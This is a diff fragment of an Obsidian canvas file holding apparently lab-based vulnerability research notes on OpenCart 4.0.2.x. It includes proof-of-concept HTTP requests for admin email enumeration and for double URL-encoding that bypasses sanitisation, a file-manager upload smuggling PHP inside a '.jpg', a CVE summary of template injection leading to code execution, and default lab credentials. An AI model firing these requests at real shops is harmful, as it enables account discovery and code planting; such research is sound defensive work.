+      "text": "# Email enumeration in common/forgotten.confirm\n\n```php title:'admin_secret/controller/common/forgotten.php'\npublic function confirm(): void {\n\t...\n\t$this->load->model('user/user');\n\n\t$user_info = $this->model_user_user->getUserByEmail($this->request->post['email']);\n\n\tif (!$user_info) {\n\t\t$json['error'] = $this->language->get('error_email');\n\t}\n\n\tif (!$json) {\n\t\t$this->model_user_user->editCode($this->request->post['email'], oc_token(40));\n\n\t\t$this->session->data['success'] = $this->language->get('text_success');\n\n\t\t$json['redirect'] = $this->url->link('common/login', '', true);\n\t}\n\n\t$this->response->addHeader('Content-Type: application/json');\n\t$this->response->setOutput(json_encode($json));\n}\n```\n\n```http\nPOST /admin/index.php?route=common/forgotten.confirm HTTP/1.1\nHost: 127.0.0.1\n\nemail=dem1@demo.com\n\n\nHTTP/1.1 200 OK\n{\"error\":\"Warning: The E-Mail Address was not found in our records!\"}\n\nHTTP/1.1 200 OK\n{\"redirect\":\"http:\\/\\/127.0.0.1\\/opencart-4.0.2.2\\/admin\\/index.php?route=common\\/login\"}\n```",
+      "type": "text",
+      "width": 921,
+      "x": 2385,
+      "y": -1902
+    },
+    {
+      "file": "Labs/Lab 2 - Vuln. Research/scans/opencart-regexes.md",
+      "height": 922,
+      "id": "d8eecf3260e78ee9",
+      "styleAttributes": {
+      },
+      "type": "file",
+      "width": 1562,
+      "x": 796,
+      "y": -3733
+    },
+    {
+      "color": "6",
+      "height": 711,
+      "id": "f3ca64c09118de8a",
+      "styleAttributes": {
+        "shape": null,
+        "textAlign": null
+      },
+      "text": "# General Information\n\nTags: #opencart #vulnerability-research/finished \n\nProduct: [opencart](Play%20ground/Targets/opencart/opencart.md)\n\n## Product Documentation\n\n- [OpenCart official web site](https://www.opencart.com/)\n- [Documentation](https://docs.opencart.com/)\n    - [Developer documentation](https://docs.opencart.com/en-gb/developer/module/)\n- [OpenCart Forum](https://forum.opencart.com/)\n- [OpenCart releases on GitHub](https://github.com/opencart/opencart/releases)\n- [OpenCart bug tracker on GitHub](https://github.com/opencart/opencart/issues)\n\nScope:\n- v4.0.2.3\n\nPassword:\n- commerce panel\n\tuser : user - user@localhost.com\n- admin panel\n\tadmin : admin\n\tdemo : demo",
+      "type": "text",
+      "width": 582,
+      "x": -151,
+      "y": -1264
+    },
+    {
+      "height": 916,
+      "id": "bd3975130bc38ec9",
+      "styleAttributes": {
+        "border": "dashed"
+      },
+      "text": "# URL encoding not enforced correctly (?)\n\nThere are some discrepancies between url-encoded and double url-encoded inputs, because sanitization is performed when parsing the `$_GET` array in the OpenCart core, but it is not url-decoded before encoding it.\n\n```http\nGET /index.php?route=account/login&language=en-gb&redirect=%22%3e%66%6f%6f HTTP/1.1\nHost: localhost\n\n--- RESPONSE ---\n\nHTTP/1.1 200 OK\n\nFrom $_GET: \">foo\nFrom this->request->get: &quot;&gt;foo\nAfter urldecode: &quot;&gt;foo\nBefore load view: &quot;&gt;foo\nFinal output: &quot;&gt;foo\n```\n\nWith double url-encode:\n\n```http\nGET /index.php?route=account/login&language=en-gb&redirect=%25%32%32%25%33%65%25%36%36%25%36%66%25%36%66 HTTP/1.1\nHost: localhost\n\n--- RESPONSE ---\n\nHTTP/1.1 200 OK\n\nFrom $_GET: %22%3e%66%6f%6f\nFrom this->request->get: %22%3e%66%6f%6f\nAfter urldecode: \">foo\nBefore load view: \">foo\nFinal output: \">foo\n```",
+      "type": "text",
+      "width": 821,
+      "x": 909,
+      "y": -1269
+    },
+    {
+      "color": "#383fff",
+      "height": 518,
+      "id": "7a9075e0d6907e67",
+      "styleAttributes": {
+      },
+      "text": "# To Do\n\n- [x] check regexes\n- [x] check semgrep result with custom rules\n- [x] check remediation common/security.storage\n- [x] upload/admin_secret/controller/design/translation.php",
+      "type": "text",
+      "width": 560,
+      "x": 1017,
+      "y": -2179
+    },
+    {
+      "height": 204,
+      "id": "7ca354fd21654453",
+      "styleAttributes": {
+        "border": "invisible"
+      },
+      "text": "# Queries on 200 OK files\n\n```shell\n$ cat file-list.json | jq '.results[] | select(.length!=0 and .status==200) | .url' | grep '\\.php' | wc\n    486     486   30850\n```",
+      "type": "text",
+      "width": 1031,
+      "x": -2080,
+      "y": -601
+    },
+    {
+      "height": 536,
+      "id": "baac9efa36d45cdc",
+      "styleAttributes": {
+        "border": "dashed"
+      },
+      "text": "# Arbitrary File upload in common/filemanager.upload\n\n>[!info]\n>- We can only upload images extensions, but we can upload files under `image/catalog` that is inside the web root\n\n```http\nPOST /opencart-latest/admin/index.php?route=common/filemanager.upload&user_token=40cc3d40e897751f863b18ea52eaa3e9&directory=demo\n...\n------WebKitFormBoundarypLaaWGyOpjHmWgxX\nContent-Disposition: form-data; name=\"file[]\"; filename=\"foo.jpg\"\nContent-Type: image/png\n\n<?php phpinfo(); ?>\n\n------WebKitFormBoundarypLaaWGyOpjHmWgxX--\n```\n\n",
+      "type": "text",
+      "width": 1000,
+      "x": 3350,
+      "y": -2890
+    },
+    {
+      "color": "2",
+      "height": 458,
+      "id": "488acef427bc0ca2",
+      "styleAttributes": {
+      },
+      "text": "# CVE-2024-40420 Server Side Template Injection\n\nThe openCart project v4.0.2.3 contains a server side template injection vulnerability in it's edit theme functionality, which allows an authenticated admin user to execute arbitrary system commands, resulting in remote code execution. This happens due to lack of template sandboxing and blacklisting of potentially dangerous template content.\n\nhttps://github.com/A3h1nt/CVEs/blob/main/OpenCart/Readme.md",
+      "type": "text",
+      "width": 483,
+      "x": 3188,
+      "y": 524
+    }
+  ]
+}
